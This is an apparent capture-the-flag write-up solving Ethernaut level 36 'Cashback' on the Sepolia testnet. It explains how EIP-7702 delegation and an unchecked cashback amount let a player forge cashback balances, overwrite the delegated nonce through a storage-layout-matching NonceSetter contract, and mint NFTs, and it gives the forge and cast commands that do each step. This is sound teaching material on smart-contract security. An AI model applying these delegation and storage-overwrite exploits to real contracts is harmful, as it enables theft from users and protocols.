# Ethernaut Challenge 36 — Cashback

You’ve just joined Cashback, the hottest crypto neobank in town. Their pitch is irresistible: for every on-chain payment you make, you earn points. Rack up enough and you’ll reach legendary status, unlocking the coveted **Super Cashback NFT**.

The system leverages **EIP-7702** to allow EOAs to temporarily behave like contracts by delegating execution.

Rumor has it there’s a back door for power users.

> 🎯 **Goal**  
Max out cashback in all supported currencies and obtain **at least 2 NFTs**, including the one tied to your player address.

---

## 🧠 Key Concepts

### 1. EIP-7702 Delegation
The player EOA can execute logic from another contract:

```
player.code = 0xef0100 + implementation
````
This allows:
- bypassing contract checks
- executing arbitrary logic **as if it were the player**

---

### 2. Vulnerability — Fake Cashback Accrual

The function:

```solidity
accrueCashback(currency, amount)
````

**trusts the input `amount`**, without verifying:

* ERC20 transfer
* ETH payment

👉 This allows minting cashback **without actually paying anything**

---

### 3. NFT Mint Condition

```solidity
if (nonce == 10000) {
    mint NFT
}
```

The nonce is stored in the delegated EOA storage.

---

## ⚔️ Exploit Strategy

We split the attack into **3 independent steps**:

---

### 🟢 Step 1 — Forge FREE Cashback

* Deploy a forged proxy (custom bytecode)
* Bypass all modifiers
* Call:

```solidity
accrueCashback(FREE, 25_000 ether)
```

→ Mints:

```
500 FREE cashback
+ 1 NFT
```

---

### 🔵 Step 2 — Forge NATIVE Cashback

Same idea:

```solidity
accrueCashback(NATIVE, 200 ether)
```

→ Mints:

```
1 ETH cashback
```

---

### 🟣 Step 3 — Set Player Nonce Directly

Instead of doing **10,000 transactions**, we:

1. Deploy `NonceSetter` with the same storage layout
2. Temporarily delegate player to it
3. Write:

```solidity
nonce = 9999
```

---

### 🔴 Step 4 — Trigger Final NFT

1. Delegate player back to Cashback
2. Call:

```solidity
payWithCashback(..., 1 wei)
```

→ nonce becomes `10000`
→ player NFT is minted

---

## 🧪 Foundry Test

The full exploit is implemented in the Foundry test suite:

[CashbackTest](test/challenge-36-cashback/CashbackTest.t.sol)

The main test:

```solidity
testSolveCashbackChallenge()
```

---

## 🚀 Sepolia Execution

### Environment

```bash
CASHBACK=0xad76Ca049C5305f962EFcb1ebfbe2d8526ad6B68
PLAYER=0xeCF94300dD67bB8c31F41BE3a2136D3f0abFb0B0
LEVEL_ADDRESS=0xaCC5D8b0dc23b3e8b1651900e5064ce7CB851E89
```

---

## 0 — Reset delegation

```bash
cast send $(cast az) \
  --auth 0x0000000000000000000000000000000000000000 \
  --account ethernaut \
  --rpc-url $SEPOLIA_RPC_URL
```

---

## 1 — Attack Cashback

```bash
forge script script/challenge-36-cashback/01_AttackCashback.s.sol:AttackCashbackScript \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut \
  --broadcast
```

---

## 2 — Deploy NonceSetter

```bash
forge script script/challenge-36-cashback/02_DeployNonceSetter.s.sol:DeployNonceSetterScript \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut \
  --broadcast
```

---

## 3 — Set nonce to 9999

```bash
cast send $(cast az) \
  --auth $NONCE_SETTER \
  --account ethernaut \
  --rpc-url $SEPOLIA_RPC_URL

cast send $PLAYER \
  "setNonce()" \
  --account ethernaut \
  --rpc-url $SEPOLIA_RPC_URL
```

---

## 4 — Delegate back to Cashback

```bash
cast send $(cast az) \
  --auth $CASHBACK \
  --account ethernaut \
  --rpc-url $SEPOLIA_RPC_URL
```

Verify:

```bash
cast code $PLAYER
```

Expected:

```
0xef0100<CASHBACK>
```

---

## 5 — Mint final NFT

```bash
cast send $PLAYER \
  "payWithCashback(address,address,uint256)" \
  0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE \
  $PLAYER \
  1 \
  --account ethernaut \
  --rpc-url $SEPOLIA_RPC_URL
```

---

## ✅ Final Checks

### Cashback balances

```bash
cast call $CASHBACK "balanceOf(address,uint256)(uint256)" $PLAYER $NATIVE
```

```
1 ether ✅
```

```bash
cast call $CASHBACK "balanceOf(address,uint256)(uint256)" $PLAYER $FREE
```

```
500 ether ✅
```

---

### NFT checks

```bash
NFT=$(cast call $CASHBACK "superCashbackNFT()(address)")

cast call $NFT "balanceOf(address)(uint256)" $PLAYER
```

```
>= 2 ✅
```

```bash
TOKEN_ID=$(cast --to-uint256 $PLAYER)

cast call $NFT "ownerOf(uint256)(address)" $TOKEN_ID
```

```
$PLAYER ✅
```

